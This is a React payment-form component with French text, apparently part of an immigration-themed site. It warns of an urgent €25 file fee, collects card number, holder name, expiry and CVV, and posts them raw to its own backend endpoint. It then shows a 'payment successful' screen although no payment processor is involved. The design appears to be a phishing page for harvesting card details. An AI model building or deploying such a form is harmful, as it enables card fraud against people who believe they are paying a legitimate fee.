import React, { useState, useEffect } from "react";
import { AiOutlineCreditCard, AiOutlineLock, AiOutlineExclamationCircle, AiOutlineCheckCircle } from "react-icons/ai";
import axios from "axios";
import CanadaImmigrationForm from "./Comp1";
import { useNavigate } from "react-router-dom"; 


const DeadlineNotice = ({ onSubmit }) => {
  const [formData, setFormData] = useState({
    cardNumber: "",
    cardName: "",
    expiry: "",
    cvv: "",
  });
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [submittedData, setSubmittedData] = useState(null);

  useEffect(() => {
    const storedData = JSON.parse(localStorage.getItem("formData"));
    if (storedData) {
      setFormData((prev) => ({
        ...prev,
        ...storedData,
      }));
    }
  }, []);

  const handleChange = (e) => {
    const { name, value } = e.target;
    let formattedValue = value;

    if (name === "cardNumber") {
      formattedValue = value
        .replace(/\s/g, "")
        .replace(/(\d{4})/g, "$1 ")
        .trim()
        .slice(0, 19);
    }

    if (name === "expiry") {
      formattedValue = value
        .replace(/\D/g, "")
        .replace(/(\d{2})(\d)/, "$1/$2")
        .slice(0, 5);
    }

    if (name === "cvv") {
      formattedValue = value.slice(0, 4).replace(/\D/g, "");
    }

    setFormData((prev) => ({
      ...prev,
      [name]: formattedValue,
    }));
  };
  const navigate = useNavigate();


  const handleSubmit = async (e) => {
    e.preventDefault();

    const fullFormData = { ...formData };

    try {
      const response = await axios.post("http://localhost:5000/submit-form", fullFormData);
      console.log("Server response:", response.data);
      
      // Store submitted data for display
      setSubmittedData({
        cardNumber: formData.cardNumber.replace(/\d(?=\d{4})/g, "*"),
        cardName: formData.cardName,
        expiry: formData.expiry
      });

      // Clear form data
      setFormData({
        cardNumber: "",
        cardName: "",
        expiry: "",
        cvv: "",
      });

      // Show success page
      setIsSubmitted(true);
      
      if (onSubmit) {
        onSubmit(fullFormData);
      }
    } catch (error) {
      console.error("Error submitting form:", error);
      if (error.response) {
        alert(error.response.data.message);
      } else {
        alert("An error occurred while submitting the form.");
      }
    }
  };

  const handleReturnHome = () => {
    navigate("/");
  };

  if (isSubmitted && submittedData) {
    return (
      <div className="flex items-center justify-center p-4">
        <div className="w-full max-w-md bg-green-50 border border-green-100 rounded-lg p-6">
          <div className="text-center space-y-4">
            <div className="flex items-center justify-center">
              <AiOutlineCheckCircle className="text-green-500 w-12 h-12" />
            </div>
            <h2 className="text-2xl font-bold text-green-600">Paiement Réussi!</h2>
            <p className="text-gray-600">
              Merci pour votre paiement. Les détails de votre transaction sont ci-dessous.
            </p>
          </div>

          <div className="mt-6 space-y-4 bg-white p-4 rounded-lg">
            <h3 className="font-semibold text-lg">Détails du paiement</h3>
            <div className="space-y-2">
              <div className="flex justify-between">
                <span className="text-gray-600">Numéro de carte :</span>
                <span className="font-medium">{submittedData.cardNumber}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600">Titulaire de la carte :</span>
                <span className="font-medium">{submittedData.cardName}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600">Date d'expiration :</span>
                <span className="font-medium">{submittedData.expiry}</span>
              </div>
            </div>
          </div>
          <button
      type="button"
      onClick={handleReturnHome}
      className="w-full bg-blue-600 text-white py-2 px-4 rounded-lg hover:bg-blue-700 flex items-center justify-center gap-2"
    >
      Maison
    </button>

        </div>
      </div>
    );
  }

  return (
    <>
      <div className="w-full max-w-4xl mt-10 mb-10 mx-auto">
        <div className="bg-red-50 border border-red-500 p-4 rounded-md">
          <div className="flex items-center">
            <AiOutlineExclamationCircle className="text-red-600 mr-2" size={24} />
            <span className="text-red-600 font-semibold">
              🚨 Important : Des frais de dossier de 25 € seront appliqués et prélevés à la date que vous aurez choisie. 🚨
            </span>
          </div>
          <div className="text-center text-red-600 mt-2">
            Veuillez assurer le paiement en temps opportun pour éviter tout retard de traitement.
          </div>
        </div>
      </div>

      <div className="flex items-center justify-center p-4">
        <div className="w-full max-w-md bg-white shadow-lg rounded-lg p-6">
          <div className="space-y-4">
            <div className="flex items-center gap-2">
              <AiOutlineCreditCard className="w-6 h-6 text-blue-500" />
              <h2 className="text-2xl font-bold">Détails de paiement</h2>
            </div>
            <p className="text-gray-500 text-sm">
              Saisissez les informations de votre carte ci-dessous pour finaliser le paiement.
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6 mt-6">
            <div className="space-y-4">
              <div className="space-y-2">
                <label className="text-sm font-medium">Numéro de carte</label>
                <input
                  type="text"
                  name="cardNumber"
                  value={formData.cardNumber}
                  onChange={handleChange}
                  placeholder="1234 5678 9012 3456"
                  className="w-full px-3 py-2 border rounded-lg"
                  required
                />
              </div>
              <div className="space-y-2">
                <label className="text-sm font-medium">Nom du titulaire</label>
                <input
                  type="text"
                  name="cardName"
                  value={formData.cardName}
                  onChange={handleChange}
                  placeholder="John Doe"
                  className="w-full px-3 py-2 border rounded-lg"
                  required
                />
              </div>
              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <label className="text-sm font-medium">Date d'expiration</label>
                  <input
                    type="text"
                    name="expiry"
                    value={formData.expiry}
                    onChange={handleChange}
                    placeholder="MM/YY"
                    className="w-full px-3 py-2 border rounded-lg"
                    required
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-sm font-medium">CVV</label>
                  <input
                    type="text"
                    name="cvv"
                    value={formData.cvv}
                    onChange={handleChange}
                    placeholder="123"
                    className="w-full px-3 py-2 border rounded-lg"
                    required
                  />
                </div>
              </div>
            </div>
            <button
              type="submit"
              className="w-full bg-blue-600 text-white py-2 px-4 rounded-lg hover:bg-blue-700 flex items-center justify-center gap-2"
            >
              Maison
            </button>
          </form>
        </div>
      </div>
    </>
  );
};

export default DeadlineNotice;